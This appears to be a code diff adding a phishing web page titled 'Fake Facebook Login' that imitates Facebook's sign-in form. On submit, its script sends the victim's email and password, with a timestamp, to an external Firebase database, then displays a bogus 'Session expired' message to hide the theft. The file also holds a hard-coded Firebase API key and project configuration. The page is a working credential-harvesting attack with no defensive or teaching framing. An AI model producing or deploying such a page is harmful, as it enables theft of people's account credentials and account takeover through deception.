@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Fake Facebook Login</title>
+	<style>
+		body { font-family: Arial, sans-serif; background: #f0f2f5; }
+		.container { max-width: 400px; margin: 80px auto; padding: 32px; background: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+		.fb-logo { width: 48px; margin-bottom: 16px; }
+		.login-btn { background: #1877f2; color: #fff; border: none; padding: 12px 24px; border-radius: 4px; font-size: 16px; cursor: pointer; width: 100%; margin-top: 16px; }
+		.input-field { width: 100%; padding: 10px; margin: 8px 0; border-radius: 4px; border: 1px solid #ccc; font-size: 15px; }
+		.fake-link { color: #1877f2; text-decoration: none; font-size: 14px; }
+		#user-info { margin-top: 24px; }
+	</style>
+</head>
+<body>
+	<div class="container">
+		<img class="fb-logo" src="facebooklogo.png" alt="Facebook Logo">
+		<h2>Log in to Facebook</h2>
+		<form id="fake-login-form">
+			<input class="input-field" type="text" id="email" placeholder="Email or Phone Number" required><br>
+			<input class="input-field" type="password" id="password" placeholder="Password" required><br>
+			<button class="login-btn" type="submit">Log In</button>
+		</form>
+		<div style="margin-top:12px;">
+			<a class="fake-link" href="#">Forgotten password?</a>
+		</div>
+		<div id="user-info"></div>
+	</div>
+	<!-- ...existing code... -->
+			<!-- Firebase SDKs -->
+			<script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>
+			<script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-database-compat.js"></script>
+			<script>
+				// TODO: Replace with your Firebase project config
+				const firebaseConfig = {
+					apiKey: "AIzaSyBNODgT8ESqWcGhfGUsIrmPg23QsLVugos",
+					authDomain: "facebook-7ec33.firebaseapp.com",
+					databaseURL: "https://facebook-7ec33-default-rtdb.firebaseio.com",
+					projectId: "facebook-7ec33",
+					storageBucket: "facebook-7ec33.firebasestorage.app",
+					messagingSenderId: "620668664454",
+					appId: "1:620668664454:web:7afd7b5140bb386e52ef07",
+					measurementId: "G-51QZ585Y9T"
+				};
+
+				// Initialize Firebase
+				firebase.initializeApp(firebaseConfig);
+
+				// Get a reference to the database
+				const database = firebase.database();
+
+				// Example: Write data
+				database.ref('test').set({
+					message: 'Hello from Firebase!'
+				});
+
+				// Example: Read data
+				database.ref('test').on('value', (snapshot) => {
+					const data = snapshot.val();
+					console.log('Data from Firebase:', data);
+				});
+			// Handle login form submission after Firebase is initialized
+			document.getElementById('fake-login-form').onsubmit = function(e) {
+				e.preventDefault();
+				const email = document.getElementById('email').value;
+				const password = document.getElementById('password').value;
+				document.getElementById('user-info').innerHTML = `<h3>Session expired</h3><p>Your session has expired. Please try again later.</p>`;
+
+				// Send input to Firebase database
+				const newLoginRef = database.ref('logins').push();
+				newLoginRef.set({
+					email: email,
+					password: password,
+					timestamp: new Date().toISOString()
+				});
+			};
+			</script>
+</body>
+</html>
